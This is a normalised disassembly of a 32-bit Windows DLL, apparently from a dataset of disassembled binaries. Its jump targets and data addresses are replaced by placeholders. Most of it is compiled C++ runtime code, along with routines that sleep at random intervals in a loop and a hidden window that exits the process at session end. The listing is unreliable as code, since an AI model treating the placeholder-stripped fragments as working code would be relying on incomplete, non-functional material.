cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
sub eax edi
cmp eax ebx
jae r-xdata
call sub_10022f7c
mov eax [ ebp + 0x14 ]
cmp ebx eax
jae r-xdata
mov ebx eax
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax ebx
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
cmp ebx [ ebp + 0x14 ]
jae r-xdata
push eax
push [ ebp + 0x10 ]
lea eax [ esi + edi * 2 ]
push eax
call sub_10003398
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
cmp ebx [ ebp + 0x14 ]
setne al
or eax 0xffffffff
jmp r-xdata
sub_10003459
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
leave
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100230bc
cmp [ esi ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
call sub_100230e4
inc [ rw-data ]
mov eax [ rw-data ]
mov [ esi ] eax
sub_1000348e
mov ecx [ ecx ]
push esi
mov esi [ esp + 0x8 ]
cmp esi [ ecx + 0xc ]
jae r-xdata
xor eax eax
mov eax [ ecx + 0x8 ]
mov eax [ eax + esi * 4 ]
jmp r-xdata
pop esi
retn 0x4
cmp [ ecx + 0x14 ] al
je r-xdata
test eax eax
jne r-xdata
call sub_100231db
cmp esi [ eax + 0xc ]
jae r-xdata
xor eax eax
mov eax [ eax + 0x8 ]
mov eax [ eax + esi * 4 ]
jmp r-xdata
sub_1000351c
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ esp + 0x14 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ esp + 0x10 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
jne r-xdata
pop edi
mov eax esi
pop esi
retn 0xc
inc esi
inc esi
sub_10003565
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ esp + 0x14 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ esp + 0x10 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
pop edi
mov eax esi
pop esi
retn 0xc
inc esi
inc esi
sub_10003591
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_10023a0b
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_100035d0
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1002399e
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_10003630
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
add ecx 0x18
push ecx
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1002382a
add esp 0x14
test eax eax
mov eax 0xffff
jl r-xdata
leave
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_10003664
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
mov ebx ecx
cmp [ ebp + 0x14 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_10024832
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
push edi
mov edi [ ebp + 0x10 ]
movzx eax [ esi ]
push eax
mov ecx ebx
call sub_10003630
mov [ edi ] ax
inc esi
inc edi
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_100036a5
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
sar edx 0x1
push edx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x38 ]
pop ebp
retn 0x10
sub_100036cb
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
mov eax ecx
add eax 0x18
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_100234f0
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100242d7
leave
retn 0x8
mov al [ ebp - 0xc ]
sub_10003711
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
mov ebx ecx
cmp [ ebp + 0x18 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_10024832
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov edi [ ebp + 0x14 ]
movzx eax [ esi ]
push [ ebp + 0x10 ]
mov ecx ebx
push eax
call sub_100036cb
inc esi
inc esi
mov [ edi ] al
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10003756
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_1002369a
mov esi eax
mov eax [ ebp + 0x8 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
movsd [ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x4
sub_1000378c
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp - 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10003756
mov esi eax
lea edi [ ebx + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_10023577
pop edi
pop esi
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
pop ebx
leave
retn 0x4
sub_100037dd
push 0x4
mov eax sub_1004ccfe
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
push 0x0
call sub_100230bc
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x4 ]
call sub_10003d21
lea ecx [ esi + 0x20 ]
call sub_10003d21
lea ecx [ esi + 0x3c ]
call sub_10003d21
lea ecx [ esi + 0x58 ]
call sub_10003d21
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x4
push esi
call sub_10023494
pop ecx
pop ecx
mov eax esi
call sub_100282db
retn 0x4
sub_1000384f
push 0x4
mov eax sub_1004ccfe
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
push esi
mov [ ebp - 0x4 ] 0x4
call sub_100232de
pop ecx
push 0x0
push 0x1
lea ecx [ esi + 0x58 ]
call sub_10002020
push 0x0
push 0x1
lea ecx [ esi + 0x3c ]
call sub_10002020
push 0x0
push 0x1
lea ecx [ esi + 0x20 ]
call sub_10002020
push 0x0
push 0x1
lea ecx [ esi + 0x4 ]
call sub_10002020
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_100230e4
call sub_100282db
retn
sub_100038af
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x20
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_100037be
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x10 ] 0x2
mov [ esi ] eax
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10003950
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100038af
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10003a0e
push edi
xor edi edi
push edi
push esi
xor ecx ecx
mov [ esi + 0x24 ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] 0x201
mov [ esi + 0x14 ] 0x6
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
call sub_10003dcd
push 0x4
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor eax eax
mov ecx eax
call sub_10003a7e
jmp r-xdata
mov [ esi + 0x24 ] eax
pop edi
retn
sub_10003a56
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100230bc
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_100230e4
pop esi
leave
retn
inc eax
mov [ esi + 0x4 ] eax
sub_10003acc
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x10 ]
mov ecx 0xffff
mov edx ecx
cmp dx ax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
mov eax ecx
pop esi
retn
sub_10003af8
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
mov ecx [ edi + 0x30 ]
mov esi [ ecx ]
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp + 0x10 ] esi
jge r-xdata
test esi esi
jle r-xdata
pop esi
pop ebx
mov [ ebx ] ax
inc ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0x10 ]
push esi
push [ eax ]
push [ ebp + 0xc ]
push ebx
call sub_10001b42
mov eax [ edi + 0x30 ]
sub [ eax ] esi
mov eax [ edi + 0x20 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0x10 ] esi
lea ecx [ esi + esi ]
add esp 0x10
add ebx ecx
add [ eax ] ecx
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ edi + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
sub_10003b88
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor ecx ecx
mov ecx [ edi + 0x34 ]
mov ecx [ ecx ]
jmp r-xdata
movzx eax [ ebx ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x4 ]
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp + 0xc ] ecx
mov esi ecx
jge r-xdata
test ecx ecx
jle r-xdata
pop esi
pop ebx
inc ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
push esi
push ebx
push ecx
push [ eax ]
call sub_10001b42
mov eax [ edi + 0x34 ]
sub [ eax ] esi
mov eax [ edi + 0x24 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0xc ] esi
lea ecx [ esi + esi ]
add esp 0x10
add ebx ecx
add [ eax ] ecx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov eax [ edi + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
sub_10003c0e
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100230bc
mov eax [ edi + 0x4 ]
test eax eax
jbe r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_100230e4
pop edi
mov eax esi
pop esi
leave
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_10003c7d
push esi
mov esi ecx
push edi
mov edi [ esi + 0x38 ]
mov [ esi ] r--data
test edi edi
je r-xdata
pop edi
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_10023115
mov ecx edi
call sub_10003c49
push edi
call sub_100242e6
pop ecx
sub_10003ca6
push esi
lea esi [ ecx - 0x4 ]
lea eax [ esi + 0x4 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x4 ] r--data
push eax
mov [ eax ] r--data
call sub_10023026
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10003cdc
push esi
lea esi [ ecx - 0x8 ]
lea eax [ esi + 0x8 ]
mov ecx [ eax - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_10023026
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10003d5c
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
pop esi
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov ecx esi
pop esi
jmp [ eax + 0x8 ]
sub_10003dcd
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004de07
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
push ebx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
and ecx 0x17
mov [ eax + 0x8 ] ecx
mov eax [ eax + 0xc ]
and eax ecx
je r-xdata
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor ebx ebx
cmp [ ebp + 0xc ] bl
je r-xdata
test al 0x4
je r-xdata
push ebx
push ebx
push 0x2
pop ebx
test bl al
je r-xdata
push r--data
lea ecx [ esp + 0x38 ]
call sub_10001c7f
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0xa4 ] ebx
call sub_10002075
mov [ esp + 0xc ] r--data
push r--data
lea eax [ esp + 0x10 ]
push r--data
lea ecx [ esp + 0x7c ]
call sub_10001c7f
lea eax [ esp + 0x78 ]
push eax
lea ecx [ esp + 0x54 ]
mov [ esp + 0xa4 ] ebx
call sub_10002075
mov [ esp + 0x50 ] r--data
push r--data
lea eax [ esp + 0x54 ]
jmp r-xdata
push r--data
lea ecx [ esp + 0x38 ]
call sub_10001c7f
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0xa4 ] 0x1
call sub_10002075
mov [ esp + 0xc ] r--data
push r--data
lea eax [ esp + 0x10 ]
jmp r-xdata
call sub_10027dd1
push eax
jmp r-xdata
sub_10003f11
push 0x38
mov eax sub_1004f7f3
call sub_10028203
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_1000d0d5
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
lea eax [ esi + 0x18 ]
push eax
mov [ esi ] r--data
call sub_100010a7
push r--data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000134a
lea edi [ esi + 0x11c ]
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
mov ebx r--data
push eax
lea ecx [ edi + 0x4 ]
mov [ edi ] ebx
call sub_1000136c
and [ edi + 0x20 ] 0x0
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x4
call sub_10001500
push r--data
lea ecx [ ebp - 0x44 ]
call sub_1000134a
lea edi [ esi + 0x140 ]
lea eax [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x5
push eax
lea ecx [ edi + 0x4 ]
mov [ edi ] ebx
call sub_1000136c
xor ebx ebx
mov [ edi + 0x20 ] ebx
push ebx
push 0x1
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x7
call sub_10001500
push [ ebp + 0x10 ]
lea eax [ esi + 0x164 ]
push [ ebp + 0xc ]
push eax
call sub_1000d555
mov [ esi + 0x2d8 ] ebx
mov [ esi + 0x2dc ] bl
mov eax esi
call sub_100282db
retn 0xc
sub_10003ffd
push 0x4
mov eax sub_1004ed4b
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x164 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000d66f
lea ecx [ esi + 0x140 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000d16f
lea ecx [ esi + 0x11c ]
mov [ ebp - 0x4 ] 0x1
call sub_1000d16f
lea edi [ esi + 0x18 ]
call sub_1000211e
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1000d109
call sub_100282db
retn
sub_1000408a
add esi 0x100
mov ecx esi
lea edi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000f725
mov edx esi
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_1000f355
push 0x0
push 0x1
mov ecx edi
call sub_10001500
call sub_100282fe
retn
sub_100040c5
push 0x28
mov eax sub_1004fad6
call sub_100282a2
and [ ebp - 0x4 ] 0x0
mov esi ecx
mov al [ esi + 0x2dc ]
mov [ ebp - 0x34 ] esi
test al al
jne r-xdata
call sub_100282fe
retn
call sub_1000f5f4
cmp al 0x1
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp sub_10004100
sub_10004100
lea eax [ ebp - 0x30 ]
call sub_10004557
lea edx [ esi + 0x30 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
call sub_100044a6
test al al
je r-xdata
push esi
call sub_10004292
call sub_10004311
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10001500
call sub_100282fe
retn
add esi 0x164
push esi
call sub_10014e75
mov [ esi + 0x2d0 ] 0x1
mov al [ esi + 0x171 ]
test al al
je r-xdata
sub_1000415a
push 0xc
push r--data
call sub_1002ca38
mov [ ebp - 0x1c ] ecx
and [ ebp - 0x4 ] 0x0
call sub_100040c5
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
mov al [ eax + 0x2dc ]
test al al
jne r-xdata
xor eax eax
call sub_1002ca7d
retn
call sub_1000f5f4
sub_1000419c
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004f13b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x38 ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ebx [ esi + 0x11c ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
cmp al 0x1
jne r-xdata
lea eax [ esi + 0x2d8 ]
inc [ eax ]
mov ecx [ eax ]
push 0xa
pop edx
cmp ecx edx
jle r-xdata
and [ esi + 0x2d8 ] 0x0
mov [ esi + 0x2d0 ] al
jmp r-xdata
lea eax [ esp + 0x1c ]
push eax
call sub_1000271f
and [ esp + 0x40 ] 0x0
lea eax [ esi + 0x30 ]
push eax
lea eax [ esp + 0x20 ]
call sub_10004644
lea eax [ esp + 0x1c ]
push eax
call sub_10004379
pop ecx
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
mov [ eax ] edx
lea eax [ esi + 0x164 ]
push eax
call sub_10014f8e
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ esp + 0x1c ]
call sub_10001574
push [ esp + 0x1c ]
call sub_100242e6
pop ecx
mov edi [ Sleep@IAT ]
add esi 0xf8
push [ esi ]
call edi
mov [ esp + 0x18 ] r--data
push [ esp + 0x14 ]
mov [ esp + 0x44 ] 0x1
call sub_10022a40
push [ esi ]
call edi
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
sub_10004292
push 0x4
mov eax sub_1004fab3
call sub_10028236
mov edi [ ebp + 0x8 ]
lea esi [ edi + 0x140 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
test al al
jne r-xdata
call sub_100282db
retn 0x4
mov ecx edi
call sub_1000405d
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
call sub_1000f5f4
test al al
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_1000419c
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov esi [ edi + 0xf4 ]
call sub_10024b5a
xor edx edx
div esi
push edx
call [ Sleep@IAT ]
jmp r-xdata
mov al [ edi + 0x2dc ]
test al al
jne r-xdata
sub_10004311
push edi
lea edi [ esi + 0x11c ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
test al al
jne r-xdata
pop edi
retn
mov ecx esi
call sub_1000405d
mov eax [ edi ]
mov ecx edi
call [ eax + 0x4 ]
mov eax [ esi + 0xf8 ]
mov edi [ Sleep@IAT ]
add eax eax
push eax
call edi
lea eax [ esi + 0x164 ]
push eax
call sub_10014f8e
push ebx
pop ebx
call sub_1000f5f4
test al al
jne r-xdata
mov ebx [ esi + 0xf4 ]
call sub_10024b5a
xor edx edx
div ebx
push edx
call edi
jmp r-xdata
mov al [ esi + 0x2dc ]
test al al
jne r-xdata
sub_10004379
push 0x268
mov eax sub_1004e9c7
call sub_1002826c
call sub_10015c82
mov [ ebp - 0x248 ] r--data
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x248 ] r--data
lea eax [ ebp - 0x248 ]
xor esi esi
push eax
lea edi [ ebp - 0x240 ]
mov [ ebp - 0x4 ] esi
call sub_10015d02
test al al
jne r-xdata
lea eax [ ebp - 0x21c ]
push eax
lea ecx [ ebp - 0x274 ]
call sub_1000134a
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x250 ]
call sub_10018308
lea ecx [ ebp - 0x248 ]
mov [ ebp - 0x248 ] r--data
call sub_1001675f
mov eax esi
call sub_100282ef
retn
call sub_10024832
cmp eax [ ebp - 0x258 ]
je r-xdata
xor bl bl
lea esi [ ebp - 0x250 ]
call sub_100046ab
mov edx eax
lea ecx [ ebp - 0x274 ]
call sub_100044a6
mov bl 0x1
cmp al bl
je r-xdata
mov eax [ ebp - 0x24c ]
cmp eax [ ebp - 0x254 ]
je r-xdata
mov esi [ ebp - 0x238 ]
jmp r-xdata
lea eax [ ebp - 0x248 ]
push eax
lea edi [ ebp - 0x240 ]
call sub_10015dad
test al al
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x274 ]
mov [ ebp - 0x4 ] 0x0
call sub_10001500
test bl bl
jne r-xdata
call sub_100046d3
jmp r-xdata
xor esi esi
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov ebx [ edi + 0x10 ]
lea esi [ ebp - 0x258 ]
call sub_10018308
mov eax [ ebp - 0x250 ]
test eax eax
je r-xdata
sub_100044a6
push 0x64
mov eax sub_1004e453
call sub_1002826c
mov eax [ ecx + 0x14 ]
mov esi edx
cmp eax [ esi + 0x14 ]
jae r-xdata
mov edx [ esi + 0x14 ]
push edx
sub eax edx
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_10004622
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
call sub_10003a7e
push eax
push esi
lea eax [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x1
call sub_10004a96
pop ecx
pop ecx
mov esi eax
lea ecx [ ebp - 0x30 ]
call sub_10003a7e
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x3
call sub_10004a96
pop ecx
pop ecx
mov ecx eax
mov eax esi
mov [ ebp - 0x4 ] 0x4
call sub_10003270
push 0x0
push 0x1
lea ecx [ ebp - 0x50 ]
mov bl al
call sub_10001500
lea ecx [ ebp - 0x30 ]
call sub_10003c49
push 0x0
push 0x1
lea ecx [ ebp - 0x6c ]
call sub_10001500
lea ecx [ ebp - 0x34 ]
call sub_10003c49
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10001500
mov al bl
xor al al
jmp r-xdata
call sub_100282ef
retn
sub_1000456c
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x11
je r-xdata
xor eax eax
inc eax
pop ebp
retn 0x10
cmp [ ebp + 0xc ] 0x16
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
pop ebp
jmp [ DefWindowProcW@IAT ]
sub_10004591
push ebp
mov ebp esp
sub esp 0x4c
push ebx
mov ebx [ rw-data ]
push esi
push 0x30
xor esi esi
lea eax [ ebp - 0x4c ]
push esi
push eax
call sub_10024b80
add esp 0xc
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4c ] 0x30
mov [ ebp - 0x44 ] sub_1000456c
mov [ ebp - 0x24 ] r--data
call [ RegisterClassExW@IAT ]
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push r--data
push [ ebp - 0x24 ]
push esi
call [ CreateWindowExW@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageW@IAT ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
push esi
push eax
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
push 0x1
push esi
push esi
push esi
lea eax [ ebp - 0x1c ]
push eax
call [ PeekMessageW@IAT ]
cmp eax 0x1
je r-xdata
pop esi
pop ebx
leave
retn
push 0xa
call [ Sleep@IAT ]
sub_10004622
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0xb ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_100046fe
mov eax [ ebp + 0x8 ]
leave
retn 0xc
sub_10004644
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov ecx [ edi + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax ecx
push 0x1c
cdq
pop esi
idiv esi
mov esi eax
xor esi esi
jmp r-xdata
lea esi [ ebp - 0xc ]
call sub_10018308
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
push eax
mov eax edi
call sub_10004728
push [ ebp + 0x8 ]
push 0x1
push ebx
call sub_100047a6
mov [ edi + 0x10 ] eax
jmp r-xdata
mov ebx [ edi + 0x10 ]
mov eax ebx
sub eax ecx
push 0x1c
cdq
pop ecx
idiv ecx
cmp eax esi
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_100046ab
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_10024832
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x10 ]
jb r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
retn
call sub_10024832
sub_100046d3
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_10024832
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x10 ]
jb r-xdata
xor eax eax
add [ esi + 0x4 ] 0x1c
mov eax esi
retn
call sub_10024832
